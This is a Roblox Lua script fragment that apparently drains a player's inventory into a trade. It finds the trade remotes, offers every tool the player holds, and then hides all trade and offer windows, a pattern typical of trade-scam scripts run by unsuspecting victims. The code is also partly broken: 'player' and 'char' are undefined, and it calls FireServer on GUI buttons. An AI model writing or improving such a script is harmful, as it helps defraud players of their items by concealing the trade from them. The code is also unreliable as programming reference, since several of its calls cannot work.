local RS = game:GetService("ReplicatedStorage")
local Trade = RS:FindFirstChild("Trade")
if not Trade then print("Trade folder not found"); return end

local SendReq = Trade:FindFirstChild("SendRequest")
local AcceptReq = Trade:FindFirstChild("AcceptRequest")
local StartTr = Trade:FindFirstChild("StartTrade")
local AcceptTr = Trade:FindFirstChild("AcceptTrade")
local CompleteTr = Trade:FindFirstChild("CompleteTrade")
local OfferItem = Trade:FindFirstChild("OfferItem")

if not SendReq or not AcceptReq then print("Missing remotes"); return end

-- Helper to find trade GUI (without hiding)
local function findTradeGUI()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                return child
            end
            local found = search(child)
            if found then return found end
        end
        return nil
    end
    return search(gui)
end

-- Add items by clicking GUI buttons (only when visible)
local function addItemsViaGUI()
    local tradeGUI = findTradeGUI()
    if not tradeGUI then return 0 end
    local count = 0
    for _, btn in pairs(tradeGUI:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add") or name:find("select") or name:find("offer") then
                pcall(function()
                    btn:FireServer()
                    wait(0.05)
                    btn:FireServer() -- double
                end)
                count = count + 1
            end
        end
    end
    return count
end

-- Add items via OfferItem remote (most reliable)
local function addItemsViaRemote()
    if not OfferItem then return 0 end
    local offered = 0
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, tool in ipairs(tools) do
        -- Try various arguments
        local success = false
        local patterns = {
            function() OfferItem:FireServer(tool) end,
            function() OfferItem:FireServer(tool.Name) end,
            function() OfferItem:FireServer(tool:GetAttribute("ItemId") or 0) end,
        }
        for _, p in ipairs(patterns) do
            local ok, err = pcall(p)
            if ok then success = true; break end
        end
        if success then
            offered = offered + 1
            print("Offered: " .. tool.Name)
        end
        wait(0.05)
    end
    return offered
end

-- Hide the trade GUI after items are added
local function hideTradeGUI()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request") or obj.Name:lower():find("offer")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request") or obj.Name:lower():find("offer")) then
            obj.Visible = false
        end
    end
end

